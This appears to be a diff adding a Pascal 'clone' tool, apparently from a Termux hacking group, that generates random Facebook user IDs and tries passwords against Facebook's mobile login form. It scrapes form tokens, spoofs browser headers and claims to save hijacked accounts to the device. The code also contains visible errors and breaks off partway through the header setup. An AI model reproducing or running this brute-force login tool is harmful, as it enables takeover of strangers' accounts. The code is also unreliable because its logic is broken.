@@ -1,0 +1,152 @@
+program BXB;
+writeln('program by javed iqbal sad boy [BXB] pascal expert')
+uses
+  SysUtils, Classes, fpjson, jsonparser, fphttpclient, strutils, dateutils;
+
+const
+  remover = #$1b'[1;0m';
+  green = #$1b'[1;92m';
+  orange = #$1b'[38;5;208m';
+
+var
+  userid: TStringList;
+  loop: Integer = 0;
+  oks, cps: TStringList;
+  
+function GetRandomString(const ALength: Integer): string;
+const
+  Chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+var
+  I: Integer;
+begin
+  Result := '';
+  for I := 1 to ALength do
+    Result := Result + Chars[Random(Length(Chars)) + 1];
+end;
+
+procedure Main;
+var
+  bxb_a, bxb_b, bxb_limit: string;
+  sad_boy, sad_xd: string;
+  bxb_sad: array of string;
+  i: Integer;
+begin
+  writeln('------------------------------------');
+  writeln('[◉] Author   : Javed Iqbal sad boy');
+  writeln('[◉] Facebook : Javed Iqbal sad boy');
+  writeln('[◉] Fb group : Termux Command (BXB)');
+  writeln('[◉] Version  : 0.4.7');
+  writeln('------------------------------------');
+  writeln('(1) clone random');
+  writeln('(2) contact admin');
+  writeln('(0) exit program');
+  writeln('------------------------------------');
+  write('(◉) select: ');
+  readln(bxb_a);
+  
+  if bxb_a in ['1', '01'] then
+    BXB_MX
+  else if bxb_a in ['2', '02'] then
+    OpenURL('https://www.facebook.com/profile.php?id=100010405483021')
+  else if bxb_a in ['0', '00'] then
+    begin
+      writeln('(◉) good bye');
+      Halt;
+    end
+  else
+    begin
+      writeln('(◉) please put valid option');
+      Main;
+    end;
+end;
+
+procedure BXB_MX;
+var
+  bxb_b, bxb_limit: string;
+  bxb_pws: Integer;
+  bxb_z: Integer;
+  total_pws: TStringList;
+  i: Integer;
+begin
+  userid := TStringList.Create;
+  writeln('(◉) for example 0300 or 92300');
+  write('(◉) select: ');
+  readln(bxb_b);
+  writeln('------------------------------------');
+  writeln('(◉) put ids limit example 2000,5000');
+  write('(◉) select: ');
+  readln(bxb_limit);
+  
+  for i := 1 to bxb_limit do
+  begin
+    sad_boy := GetRandomString(7);
+    userid.Add(sad_boy);
+  end;
+  
+  total_pws := TStringList.Create;
+  writeln('------------------------------------');
+  writeln('(◉) for only pro clonners');
+  writeln('------------------------------------');
+  writeln('(◉) process started...');
+  writeln('(◉) please wait...');
+  writeln('------------------------------------');
+  
+  for bxb_z := 0 to bxb_pws - 1 do
+  begin
+    writeln('done');
+    for i := 0 to userid.Count - 1 do
+    begin
+      sad_xd := total_pws[bxb_z];
+      sad_filex(userid[i], sad_xd);
+    end;
+  end;
+  
+  writeln('(◉) process complete');
+  writeln('(◉) account saved /sdcard/bxb_data');
+  writeln('(◉) press enter');
+  readln;
+  Main;
+end;
+
+procedure sad_filex(userid, sad_xd: string);
+var
+  session: TFPHTTPClient;
+  free_fb, lo: string;
+  log_data, header_freefb: TStrings;
+  log_cookies: TStringList;
+  coki, cid: string;
+begin
+  session := TFPHTTPClient.Create(nil);
+  try
+    free_fb := session.Get('https://x.facebook.com').Content;
+    log_data := TStringList.Create;
+    header_freefb := TStringList.Create;
+    log_cookies := TStringList.Create;
+    
+    log_data.Values['lsd'] := LeftStr(RegExpMatch('name="lsd" value="(.*?)"', free_fb), Length(RegExpMatch('name="lsd" value="(.*?)"', free_fb)) - 1);
+    log_data.Values['jazoest'] := LeftStr(RegExpMatch('name="jazoest" value="(.*?)"', free_fb), Length(RegExpMatch('name="jazoest" value="(.*?)"', free_fb)) - 1);
+    log_data.Values['m_ts'] := LeftStr(RegExpMatch('name="m_ts" value="(.*?)"', free_fb), Length(RegExpMatch('name="m_ts" value="(.*?)"', free_fb)) - 1);
+    log_data.Values['li'] := LeftStr(RegExpMatch('name="li" value="(.*?)"', free_fb), Length(RegExpMatch('name="li" value="(.*?)"', free_fb)) - 1);
+    log_data.Values['try_number'] := '0';
+    log_data.Values['currently_logged_in_userid'] := '0';
+    log_data.Values['unrecognized_tries'] := '0';
+    log_data.Values['locale'] := 'en_US';
+    log_data.Values['client_country_code'] := 'US';
+    log_data.Values['email'] := userid;
+    log_data.Values['pass'] := sad_xd;
+    log_data.Values['login'] := 'Log In';
+    
+    header_freefb.Values['Authority'] := 'p.facebook.com';
+    header_freefb.Values['Method'] := 'GET';
+    header_freefb.Values['path'] := '/?tbua=1';
+    header_freefb.Values['Scheme'] := 'https';
+    header_freefb.Values['Accept'] := 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
+    header_freefb.Values['Accept-Encoding'] := 'gzip, deflate, br';
+    header_freefb.Values['Accept-Language'] := 'en-US,en;q=0.9';
+    header_freefb.Values['Cache-Control'] := 'max-age=0';
+    header_freefb.Values['Referer'] := 'https://p.facebook.com/';
+    header_freefb.Values['Sec-Ch-Prefers-Color-Scheme'] := 'light';
+    header_freefb.Values['Sec-Ch-Ua'] := '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"';
+    header_freefb.Values['Sec-Ch-Ua-Full-Version-List'] := '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.82"';
+    header_freefb.Values['Sec-Ch-Ua-Mobile'] := '?0';
+   
